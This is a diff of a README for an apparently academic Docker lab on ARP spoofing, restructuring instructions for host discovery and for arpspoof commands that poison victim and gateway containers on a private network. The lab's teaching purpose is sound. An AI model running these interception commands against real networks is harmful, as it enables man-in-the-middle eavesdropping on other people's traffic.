@@ -5,12 +5,13 @@
 - [Technical Specifications](#technical-specifications)
   - [More About Docker](#more-about-docker)
 - [How to Run](#how-to-run)
+  - [Step 1: Host Discovery](#step-1-host-discovery)
+  - [Step 2: ARP Spoofing](#step-2-arp-spoofing)
+    - [Attacking Container](#attacking-container)
+    - [Victim Container](#victim-container)
+    - [Gateway Container](#gateway-container)
 - [Cheat Sheet](#cheat-sheet)
   - [Docker Actions](#docker-actions)
-  - [Get Container IPs](#get-container-ips)
-  - [Attacking Container Actions](#attacking-container-actions)
-  - [Victim Container Actions](#victim-container-actions)
-  - [Gateway Container Actions](#gateway-container-actions)
 - [Authors](#authors)
 
 ## Goal
@@ -67,13 +68,75 @@ That's it! You should now have three instances of the application running on you
 
 To access the application machines, simply go to http://localhost:8080, http://localhost:8081, and http://localhost:8082.
 
-To check which hosts are active in the network, you can run the following command:
+To follow the next steps, you will need to access the containers and open the LXTerminal, which should be the third icon on the tray.
+
+To check that everything appears to be working, you can run the following commands:
 
 ```bash
-$ python host_discovery.py <network/mask> <timeout_ms>
+# Go to root
+$ cd
+# Check the files (you should see the python project files)
+$ ls
 ```
 
-Obs.: <network/mask> has to follow the network IP address, not the host IP address.
+### Step 1: Host Discovery
+
+To check which hosts are active in the network, you can run the following command in any of the containers:
+
+```bash
+$ python3 host_discovery.py <network/mask> <timeout_ms>
+```
+
+Obs.: <network/mask> has to follow the network IP address, not the host IP address, so for example: `172.20.0.0/24` if the host IP is `172.20.0.4`.
+The <timeout_ms> is the time in milliseconds that the program will wait for a response from the hosts.
+
+### Step 2: ARP Spoofing
+
+To perform the ARP Spoofing attack, you will need to access each container and run the following commands:
+To make it easier, we adopted the standard of using localhost:8080 as the `attacker`, localhost:8081 as the `gateway`/router, and localhost:8082 as the `victim`.
+
+To get the container IPs, you can run the following command:
+
+```bash
+$ scripts/get-container-ips.sh
+```
+
+You should receive a table with the IP addresses, one for each container. Usually the end of the container IPs will be `.2`, `.3` and `.4` in a random order.
+So for example, you will receive an output like this:
+
+```bash
+ID      Address         Hostname
+2       172.20.0.2      tf_arpspoofing-labredes2-1
+3       172.20.0.3      tf_arpspoofing-labredes3-1
+1       172.20.0.4      tf_arpspoofing-labredes1-1
+```
+
+In this case, the attacker's IP is `172.20.0.4`, the gateway's IP is `172.20.0.2`, and the victim's IP is `172.20.0.3`.
+
+#### Attacking Container
+
+```bash
+# Attack the victim
+$ arpspoof -i eth0 -t 172.20.0.3 172.20.0.2
+# Attack the gateway
+$ arpspoof -i eth0 -t 172.20.0.2 172.20.0.3
+```
+
+#### Victim Container
+
+```bash
+# Ping gateway (to generate traffic)
+$ ping 172.20.0.2
+# Check the ARP table
+$ arp -n
+```
+
+#### Gateway Container
+
+```bash
+# Check the ARP table
+$ arp -n
+```
 
 ## Cheat Sheet
 
@@ -88,55 +151,6 @@ $ docker ps
 
 # Access the container
 $ docker exect -it {{container_id}} sh
-```
-
-### Get Container IPs
-```bash
-# List all container IPs
-$ scripts/get-container-ips.sh
-```
-
-You should have received three pairs of IP addresses, one for each container. 
-Usually the end of the container IPs will be .2, .3, .4 in a random order. 
-We standardized that: 
-- The smallest IP adress, in this case .2, will be respective to the gateway.
-- The middle IP will be the attacker. 
-- The last IP will be serving as the victim. 
-If you wish to change these IPs it's completely fine, but the examples bellow will be following the guidelines above. 
-Remember to alter your IPs to those you got after running the command.
-
-Obs.: the first IP in each pair you received is the loopback (127.0.0.1).
-
-
-### Attacking Container Actions
-
-```bash
-# Enter into the attacking container
-$ scripts/docker-exec.sh 1
-# Attack the target
-$ arpspoof -i eth0 -t 172.20.0.4 172.20.0.2
-# Attack the gateway
-$ arpspoof -i eth0 -t 172.20.0.2 172.20.0.4
-```
-
-### Victim Container Actions
-
-```bash
-# Enter into the gateway container
-$ scripts/docker-exec.sh 2
-# Ping gateway (to generate traffic)
-$ ping 172.20.0.2
-# Check the ARP table
-$ arp -n
-```
-
-### Gateway Container Actions
-
-```bash
-# Enter into the gateway container
-$ scripts/docker-exec.sh 3
-# Check the ARP table
-$ arp -n
 ```
 
 ## Authors
